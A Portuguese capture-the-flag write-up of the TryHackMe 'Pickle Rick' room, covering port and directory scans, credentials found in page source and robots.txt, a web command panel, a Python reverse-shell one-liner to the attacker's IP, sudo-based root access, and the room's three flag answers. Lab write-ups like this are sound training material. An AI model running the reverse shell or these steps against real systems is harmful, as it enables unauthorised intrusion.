---
description: CTF do TryhackME como fiz e anotações.
title: TryHackMe - Pickle Rick - Fácil
date: 2024-01-13 11:47:00 +/-0300
categories: [CTF, TryHackMe]
tags: [ctf, tryhackme, linux, SUID, web, facil]     # TAG names should always be lowercase
show_image_post: true
---

![piclericky](/assets/img/pickrick3.jpg){: w="100" h="100" .left}

---
# CTF - Pickle Rick
---
---
## Enumeração

### nmap 

```shell
sudo nmap -sS -Pn -n --disable-arp-ping --stats-every=7s -sVC 10.10.13.28 -T4

tarting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-11 01:22 EST
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 01:22 (0:00:00 remaining)
Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 01:22 (0:00:06 remaining)
Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 93.75% done; ETC: 01:22 (0:00:00 remaining)
Nmap scan report for 10.10.13.28
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:a9:c6:8e:d9:b8:20:47:8c:f1:e4:48:64:d2:56:85 (RSA)
|   256 e1:42:f1:cb:9f:a7:77:6c:04:06:4a:92:bf:0f:0c:e2 (ECDSA)
|_  256 e8:61:39:6b:3e:38:4d:ec:bd:81:6f:73:4c:c1:31:ca (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.63 seconds

```
{: .nolineno }



É um website

Encontrado no código fonte da paginal inicial

```text
<!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```
{: .nolineno }
### gobuster

```shell
gobuster dir -u http://10.10.13.28 -t 100  -w  /usr/share/wordlists/dirb/big.txt -r --no-error -e  -x php,txt,old

==============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.10.13.28/.php                 (Status: 403) [Size: 290]
http://10.10.13.28/.htpasswd.php        (Status: 403) [Size: 299]
http://10.10.13.28/.htpasswd            (Status: 403) [Size: 295]
http://10.10.13.28/.hta.old             (Status: 403) [Size: 294]
http://10.10.13.28/.hta                 (Status: 403) [Size: 290]
http://10.10.13.28/.hta.txt             (Status: 403) [Size: 294]
http://10.10.13.28/.htaccess.php        (Status: 403) [Size: 299]
http://10.10.13.28/.htaccess            (Status: 403) [Size: 295]
http://10.10.13.28/.hta.php             (Status: 403) [Size: 294]
http://10.10.13.28/.htaccess.old        (Status: 403) [Size: 299]
http://10.10.13.28/.htaccess.txt        (Status: 403) [Size: 299]
http://10.10.13.28/.htpasswd.old        (Status: 403) [Size: 299]
http://10.10.13.28/.htpasswd.txt        (Status: 403) [Size: 299]
http://10.10.13.28/assets               (Status: 200) [Size: 2190]
http://10.10.13.28/denied.php           (Status: 200) [Size: 882]
http://10.10.13.28/index.html           (Status: 200) [Size: 1062]
http://10.10.13.28/login.php            (Status: 200) [Size: 882]
http://10.10.13.28/portal.php           (Status: 200) [Size: 882]
http://10.10.13.28/robots.txt           (Status: 200) [Size: 17]
http://10.10.13.28/robots.txt           (Status: 200) [Size: 17]
http://10.10.13.28/server-status        (Status: 403) [Size: 299]
Progress: 18456 / 18460 (99.98%)
```
{: .nolineno }
login page encontrada http://10.10.13.28/login.php


```text
robots.txt

Wubbalubbadubdub
```
{: .nolineno }
index of em /assets contendo apenas algumas imagens e scripts

![indexoff](/assets/img/picklerick1.png)

## Acesso

login efetuado com sucesso 

Login: R1ckRul3s
Senha: Wubbalubbadubdub

http://10.10.13.28/portal.php

WebShell após o login

![webshell](/assets/img/picklerick2.png)

Permitido executar alguns comandos,os outro menus são bloqueados e direcionado para
http://10.10.13.28/denied.php

### Reverse Shell

Listei necat e executei shell reverse  nesta pagina

```python
export RHOST="10.6.125.125";export RPORT=4443;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```
{: .nolineno }

Primeira flag encontrada

```shell
www-data@ip-10-10-165-48:/var/www/html$ cat Sup3rS3cretPickl3Ingred.txt
cat Sup3rS3cretPickl3Ingred.txt
mr. meeseek hair
```
{: .nolineno }
## Escalação de Privilégio

```shell
sudo -l
Matching Defaults entries for www-data on
    ip-10-10-165-48.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on
        ip-10-10-165-48.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
www-data@ip-10-10-165-48:/home/rick$ sudo /bin/bash
sudo /bin/bash
root@ip-10-10-165-48:/home/rick# 
```
{: .nolineno }
### Segunda Flag

```shell
root@ip-10-10-165-48:/home/rick# cat "second ingredients"
cat "second ingredients"
1 jerry tear
root@ip-10-10-165-48:/home/rick# 
```
{: .nolineno }
### Terceira Flag

```shell
root@ip-10-10-165-48:~# cat 3rd.txt
cat 3rd.txt
3rd ingredients: fleeb juice
root@ip-10-10-165-48:~# 
```
{: .nolineno }